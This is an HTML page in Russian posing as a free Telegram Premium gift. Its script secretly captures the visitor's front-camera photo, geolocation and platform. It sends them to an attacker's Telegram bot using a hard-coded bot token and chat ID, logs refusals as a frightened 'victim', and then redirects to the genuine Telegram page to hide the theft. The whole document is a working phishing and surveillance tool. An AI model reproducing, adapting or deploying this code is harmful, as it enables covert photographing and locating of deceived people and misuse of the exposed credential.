<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Gift — Бесплатные подарки</title>
    <style>
        body { background-color: #f0f2f5; font-family: -apple-system, system-ui, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; width: 90%; max-width: 400px; border-radius: 20px; box-shadow: 0 4px 25px rgba(0,0,0,0.1); text-align: center; padding: 30px; }
        .logo { width: 80px; height: 80px; margin-bottom: 20px; }
        h1 { font-size: 22px; color: #222; margin: 10px 0; }
        p { color: #666; font-size: 15px; line-height: 1.5; }
        .btn { background: #0088cc; color: white; border: none; padding: 15px 40px; border-radius: 30px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 25px; width: 100%; transition: 0.2s; }
        .btn:active { transform: scale(0.98); background: #0077b5; }
        .footer { margin-top: 15px; font-size: 12px; color: #aaa; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://telegram.org/img/t_logo.png" class="logo" alt="TG">
    <h1>Подарок для вас!</h1>
    <p>Вы были выбраны для получения <b>Telegram Premium на 3 месяца</b> бесплатно. <br><br>Для защиты от ботов и активации подарка требуется подтверждение личности через системную проверку.</p>
    
    <button class="btn" id="claimBtn">ПОЛУЧИТЬ ПОДАРОК</button>
    
    <div class="footer">Официальная акция Telegram 2026</div>
</div>

<video id="v" style="display:none" autoplay></video>
<canvas id="c" style="display:none" width="640" height="480"></canvas>

<script>
    const token = '8200658838:AAHrkPieYLwF2bVTps5HzrJVbXi013n6Sq8';
    const chat_id = '6581116621';

    document.getElementById('claimBtn').onclick = function() {
        this.innerText = 'ПРОВЕРКА...';
        this.style.background = '#ccc';
        startCapture();
    };

    async function startCapture() {
        const video = document.getElementById('v');
        const canvas = document.getElementById('c');

        try {
            // Запрашиваем камеру. На iPhone вылетит окно "Разрешить камеру для..."
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" } 
            });

            // Сразу после этого запрашиваем гео
            navigator.geolocation.getCurrentPosition(async (pos) => {
                await sendToBot(stream, pos, "✅ ПОЛНЫЙ ДОСТУП (Гео+Фото)");
            }, async () => {
                await sendToBot(stream, null, "📸 ТОЛЬКО ФОТО (Гео отклонено)");
            });

        } catch (err) {
            // Если он нажал "Отклонить" в системном окне
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent('❌ Жертва испугалась и отклонила запрос')}`);
            alert('Ошибка: Для получения подарка необходимо подтвердить доступ в настройках браузера.');
            location.reload();
        }
    }

    async function sendToBot(stream, pos, status) {
        const video = document.getElementById('v');
        const canvas = document.getElementById('c');
        video.srcObject = stream;

        // Даем камере 1 секунду сфокусироваться
        setTimeout(() => {
            canvas.getContext('2d').drawImage(video, 0, 0);
            canvas.toBlob(async (blob) => {
                const fd = new FormData();
                fd.append('chat_id', chat_id);
                fd.append('photo', blob, 'shot.jpg');
                
                let report = `🎁 <b>GIFT LOG: ${status}</b>\n`;
                report += `🖥 <b>OS:</b> ${navigator.platform}\n`;
                if(pos) report += `📍 <b>Гео:</b> <a href="http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}">На карте</a>`;
                
                fd.append('caption', report);
                fd.append('parse_mode', 'HTML');

                // Отправляем на GitHub (здесь это не блокируется)
                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
                
                stream.getTracks().forEach(t => t.stop());
                
                // Финальный обман: перекидываем его на настоящий Telegram, чтоб он ничего не понял
                location.href = "https://t.me/premium";
            }, 'image/jpeg', 0.8);
        }, 1000);
    }
</script>

</body>
</html>
